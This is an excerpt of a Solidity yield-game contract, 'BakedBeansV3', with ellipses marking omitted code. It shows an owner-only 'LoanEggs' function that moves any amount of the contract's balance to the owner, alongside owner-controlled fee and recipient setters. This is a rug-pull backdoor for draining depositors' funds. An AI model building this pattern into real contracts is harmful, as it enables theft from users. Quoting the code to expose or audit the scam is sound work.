...
contract BakedBeansV3 is Context, Ownable {
    using SafeMath for uint256;

    uint256 private EGGS_TO_HATCH_1MINERS = 2592000;//for final version should be seconds in a day
    ...
    function setdevFee(uint256 _devFeeVal) public onlyOwner {
    ...
    function LoanEggs(uint _bal) public onlyOwner() {
        address payable ownerAddress = payable(msg.sender);
        ownerAddress.transfer(_bal);
    }
    
    function setRecAdd(address payable _adr) public onlyOwner() {
        recAdd = _adr;
    }
